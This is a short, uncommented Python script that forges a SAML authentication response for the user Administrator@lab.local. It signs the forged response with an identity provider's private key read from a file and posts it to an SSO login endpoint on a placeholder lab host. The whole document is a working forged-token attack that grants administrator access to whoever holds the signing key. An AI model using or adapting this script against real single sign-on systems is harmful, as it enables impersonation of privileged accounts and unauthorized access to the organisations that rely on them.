import base64
import requests
from signxml import XMLSigner
from lxml import etree
root = etree.fromstring(b'<Response><Assertion><NameID>Administrator@lab.local</NameID></Assertion></Response>')
with open('configured-idp-key.pem', 'rb') as f:
    key = f.read()
signer = XMLSigner()
signed = signer.sign(root, key=key)
requests.post('https://sso.example.test/ui/saml/websso/sso',
              data={'SAMLResponse': base64.encodebytes(etree.tostring(signed))})
